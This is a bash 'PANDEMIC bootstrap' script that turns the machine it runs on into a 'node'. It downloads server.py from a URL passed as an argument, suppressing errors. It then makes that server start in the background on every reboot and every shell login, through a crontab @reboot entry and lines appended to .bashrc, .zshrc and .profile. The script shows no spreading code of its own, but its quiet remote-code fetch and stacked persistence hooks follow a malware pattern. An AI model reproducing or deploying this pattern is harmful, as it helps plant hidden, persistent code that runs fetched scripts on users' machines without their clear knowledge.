#!/bin/bash
# THISISMYLIVE v8.0 — UNIVERSAL PANDEMIC BOOTSTRAP
# set -e

echo "[+] THISISMYLIVE v8.0 PANDEMIC Bootstrap"
echo "    Sovereign: Finn Jona Thorsten Lischke"

INSTALL_DIR="${1:-$HOME/.thisismylive}"
NODE_ID="$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -d'-' -f1 || echo $(date +%s | sha256sum | head -c 8))"

mkdir -p "$INSTALL_DIR"
cat > "$INSTALL_DIR/.node_id" << EOF
NODE_ID=$NODE_ID
SOVEREIGN=Finn Jona Thorsten Lischke
VERSION=8.0.PANDEMIC
INSTALL_DATE=$(date -Iseconds)
EOF

# Download server files
SERVER_URL="${2:-}"
if [ -n "$SERVER_URL" ]; then
    echo "[+] Downloading from $SERVER_URL..."
    curl -sL "$SERVER_URL/server.py" -o "$INSTALL_DIR/server.py" 2>/dev/null || wget -q "$SERVER_URL/server.py" -O "$INSTALL_DIR/server.py" 2>/dev/null || echo " [!] Download failed"
    curl -sL "$SERVER_URL/index.html" -o "$INSTALL_DIR/index.html" 2>/dev/null || true
else
    echo "[!] No SERVER_URL provided. Copy server.py and index.html manually to $INSTALL_DIR"
fi

# Persistence
echo "[+] Installing persistence..."
(crontab -l 2>/dev/null | grep -v "THISISMYLIVE"; echo "@reboot cd $INSTALL_DIR && nohup python3 server.py > logs/server.log 2>&1 &") | crontab - 2>/dev/null || true
for rc in ~/.bashrc ~/.zshrc ~/.profile; do
    [ -f "$rc" ] && { grep -q "THISISMYLIVE" "$rc" || echo "cd $INSTALL_DIR && nohup python3 server.py > logs/server.log 2>&1 & # THISISMYLIVE" >> "$rc"; } 2>/dev/null || true
done

mkdir -p "$INSTALL_DIR/logs"
echo "[+] Bootstrap complete — This device is now a PANDEMIC node"
echo "    Node ID: $NODE_ID"
echo "    Install: $INSTALL_DIR"
echo "    Start: cd $INSTALL_DIR && python3 server.py"
